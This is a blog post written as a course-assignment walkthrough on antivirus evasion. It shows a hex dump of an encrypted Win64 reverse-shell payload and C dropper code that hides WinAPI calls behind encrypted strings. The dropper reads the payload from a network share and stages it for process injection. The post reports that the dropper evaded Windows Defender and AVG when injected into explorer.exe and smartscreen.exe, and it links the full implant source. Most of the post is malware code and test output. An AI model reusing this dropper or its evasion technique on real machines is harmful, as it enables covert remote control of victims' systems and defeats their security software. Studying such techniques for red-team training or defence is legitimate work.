---
layout: single
title: AV Evasion - Sharing is (s)caring
date: 2020-10-02
classes: wide
header:
  teaser: /assets/images/AV_evasion/girolamo_savonarola.jpg
tags:
  - Pentester
  - Windows
  - Reverse shell
  - AV Evasion
  - Kitties
--- 
![](/assets/images/AV_evasion/girolamo_savonarola.jpg)<br>

## Introduction
Hello hackers and welcome back to the 3rd and last assignment of the well done course on Malware Development by [Sektor7](https://institute.sektor7.net/red-team-operator-malware-development-essentials), in the previous [blog post](https://blackcloud.me/the-payload-is-behind-kitties/) we saw PE injection using a payload hidden inside an image, implemented the dropper with the capacity of extraction of the payload and injecting it in the PE process target. The last assignmet ask us to encrypt a payload, load it on the file system or in our case in shared folder on the target OS, and write a dropper that open the payload and trigger the injection. The suggestions from reenz0h here are to use the [CreateFileA](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) and [ReadFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile) WinAPI functions.

## The Assignment
Let's start taking our last dropper and check what we have and what we must change.<br>
The most of the code is working pretty well as we saw, but the payload extraction has to be changed because now reenz0h asked to open the payload from a directory on the fiule system, we choosed a network sherd folder, so take a look closer to the payload memory loading and analyze what we have to change.

## the Payload
In the previous posts we already prepared and encrypted the payload that was implemented as a resource or hidden behind an image, so there isn't much work here. The AES256 encrypted payload is the same used in the last post so a simple Win64 reverse shell

Let's check the payload with ```xxd```
```bash
xxd -g1 payload_enc
00000000: 4d 37 18 fc 9d 9a ac 18 47 a6 fc 63 96 fc df 01  M7......G..c....
00000010: 1b 24 25 c0 7f 11 c6 5b 9a 8f b6 c3 1b e3 de 01  .$%....[........
00000020: 9a e3 de 83 1b e0 82 dc 60 9d 90 f8 b9 53 c9 78  ........`....S.x
00000030: 35 a3 92 1e 74 65 04 71 2f 9f e3 37 47 1a b9 3a  5...te.q/..7G..:
00000040: 55 60 f3 78 c0 64 1d ef 60 81 79 19 8e e2 44 3e  U`.x.d..`.y...D>
00000050: 06 1c 01 0c 35 8a 28 f3 38 cf 13 0e 07 05 ff 37  ....5.(.8......7
00000060: 39 98 52 b4 45 65 46 27 47 4d 1a 5d 7a 1e e3 4e  9.R.EeF'GM.]z..N
00000070: 2c 0b be e1 01 78 99 48 30 c3 01 cc e4 12 49 96  ,....x.H0.....I.
00000080: c0 d8 0d 1d 5d 0b 14 6a 64 b7 04 ae 34 6c 27 4f  ....]..jd...4l'O
00000090: 9e ef c9 58 15 86 31 57 a9 1b 8f 7c 9b 69 73 7d  ...X..1W...|.is}
000000a0: ba 53 93 34 1d db c0 c4 d9 be 2a 47 0c 63 56 0d  .S.4......*G.cV.
000000b0: 43 9d 27 fd 12 1c 11 61 ae f5 b8 d7 eb f2 ad 67  C.'....a.......g
000000c0: 25 1b f9 ef 24 4b 6c ed 04 63 ea 68 92 63 ee 75  %...$Kl..c.h.c.u
000000d0: 48 65 40 c3 50 f2 d2 88 8c 43 51 1c ea 82 67 9d  He@.P....CQ...g.
000000e0: 32 4f 13 f9 ba df da 0e dc e6 0a 69 8d 87 98 9a  2O.........i....
000000f0: df a4 41 60 a0 1b f6 85 e2 57 3c 57 d2 b6 06 b5  ..A`.....W<W....
00000100: 41 40 24 c9 2d f1 68 c4 57 6e c4 4d 43 18 e5 4f  A@$.-.h.Wn.MC..O
00000110: 09 0c 89 ff c2 d0 4a bc 55 b6 50 3a b4 53 dd 69  ......J.U.P:.S.i
00000120: 62 2d c2 89 d1 a9 11 c3 d2 57 63 ed 7f 31 e3 41  b-.......Wc..1.A
00000130: fb 91 08 1e 9e d7 94 17 58 4c 7b 0d 79 ee 9b fe  ........XL{.y...
00000140: 5f 59 b7 f3 bb 61 fb 0e eb 45 da 6c b5 9e e5 f9  _Y...a...E.l....
00000150: 65 fb 18 7f a0 9a d3 7d 63 76 79 a2 01 ea 1a f8  e......}cvy.....
00000160: dd 54 cf 64 bc 8c b2 d2 26 04 b9 d4 6d 97 78 88  .T.d....&...m.x.
00000170: 79 d8 e7 50 2a 21 18 4f 1a e3 b4 9d ec c4 de 11  y..P*!.O........
00000180: 6d 8d fc 05 d2 a1 42 ff 6b ad 75 67 16 26 93 66  m.....B.k.ug.&.f
00000190: 55 76 86 eb 4c c7 45 c1 a1 3b f5 12 a6 5a 6a 01  Uv..L.E..;...Zj.
000001a0: fe 31 13 10 77 1b cd 47 dd d8 c2 8a cc 90 ca b5  .1..w..G........
000001b0: b2 64 40 d6 0a 73 66 76 95 08 1c cc b6 f7 6f 9c  .d@..sfv......o.
000001c0: 04 46 10 53 9e 1f 09 bc 95 cf 25 70 e1 38 0b 9c  .F.S......%p.8..
```
Now we must mount the folder where the payload is, in the target OS as a shared folder. 

## the Dropper
As for the previous post the only thing to change is the way the payload is loaded in memory. 

```c
  // Load resources section
  res = pFindResourceA(NULL, MAKEINTRESOURCE(IMAGE), RT_RCDATA);
  resHandle = pLoadResource(NULL, res);
      
  // Extract payload from the image
  image = (char*)pLockResource(resHandle); // lock the resource and point to the first char of the jpg
  image_len = SizeofResource(NULL, res); // get the size of the jpg + p0 + last 7 bytes 
  
  end = image + image_len - 7; // jump to the end of the jpg and read the last 7 bytes that are the original size of the jpg without p0
  size = atoi(end); // cast from char to int, now size is the original size of the jpg
  offset = image + size; // offset points to the first char of the p0
  p0_len = image_len - size - 7; // calculate the payload size
  memcpy(p0, offset, p0_len); // copy in another memory area the effective p0

  // Allocate some memory buffer for p0
  exec_mem = pVirtualAlloc(0, p0_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // Copy p0 to new memory buffer
  pRtlMoveMemory(exec_mem, p0, p0_len);
```

In the code trunk below the Windows functions are called as pointers because of AES encryption as saw in the previous post, this techniques works very well as an AV evasion technique so we can reuse it. Now we have to change this section like this

```c
  //Define the BUFFSIZE
  #define BUFFSIZE 512

  ...
  // Define the pointer to the kernel32.dll File manipuulation functions
  HANDLE (WINAPI * pCreateFileA)(
    LPCSTR                lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
  );

  BOOL (WINAPI * pReadFile)(
    HANDLE       hFile,
    LPVOID       lpBuffer,
    DWORD        nNumberOfBytesToRead,
    LPDWORD      lpNumberOfBytesRead,
    LPOVERLAPPED lpOverlapped
  );

  ...
  // Define the encrypted name of the functions strings 
  unsigned char sCreateFileA[] = { ... };
  unsigned char sReadFile[] = { ... };
  ...

  // Decrypt the strings
  AESDecrypt((char *) sCreateFileA, sizeof(sCreateFileA), key, sizeof(key));
  AESDecrypt((char *) sReadFile, sizeof(sReadFile), key, sizeof(key));
  ...

  // Define the path where payload is stored (remember the double backslashes to avoid the escaping characters)
  // the file HANDLE and the payload buffer size
  HANDLE hFile;
  char path[] = "\\\\tsclient\\share\\payload_enc";
  char* payload[BUFFSIZE] = {0};
  ...

  // Populate the pointer to the functions with the GetModuleHandle call
  pOpenProcess = GetProcAddress(GetModuleHandle(sKernel), sOpenProcess);
  pCreateFileA = GetProcAddress(GetModuleHandle(sKernel), sCreateFileA);
  ...

  // Load the payload from FS to memory
  hFile = pCreateFileA(path, GENERIC_READ,FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  
  if (hFile == INVALID_HANDLE_VALUE) {
    return 0;
  }

  if (FALSE == pReadFile(hFile, payload, (BUFFSIZE-1), NULL, NULL)) {
    return 0;
  }
  
  // Close the HANDLE
  pCloseHandle(hFile);
  
  payload_len = strlen(payload);
  
  // Allocate some memory buffer for payload
  exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // Copy payload to new memory buffer
  pRtlMoveMemory(exec_mem, payload, payload_len);
```
After opening the file with ```CreateFileA``` function we need to read it with the ```ReadFile``` function, this function load the payload as binary stream in the ```payload``` pointer in memory. What we must do now is to calculate the payload lenght and move the payload to another RW memory buffer. After that we are ready to decrypt our payload and inject it in our PE target process.

## Tests
As in the previous post we tested the dropper on different process: ```explorer.exe```, ```notepad.exe``` and ```smartscreen.exe``` but in this case  the injection doesn't trigger Windows Defender nor AVG Free "only" on ```explorer.exe``` and ```smartscreen.exe```, AVG scan the dropper and let it execute the reverse shell payload maintaining the shell active. So, also in this case, we are following the TOON rule (Two is One and One is None) also in this case.  

![](/assets/images/AV_evasion/AVG_fs_bypass.gif)<br>

and [here](https://github.com/bolonobolo/av_evasion/tree/master/PE_Injection/Sharing%20is%20scaring/implant.cpp) you can find the dropper code. <br>
We hope you enjoied the ride on ```RedTeam Operator Malware Development Essentials``` walkthrough assignments and stay tuned for the ```Intermediate``` level posts :)

## References
Malware Dev Essentials Course
- [Sektor7](https://institute.sektor7.net/red-team-operator-malware-development-essentials)
- [reenz0h](https
://twitter.com/Sektor7Net) <br>
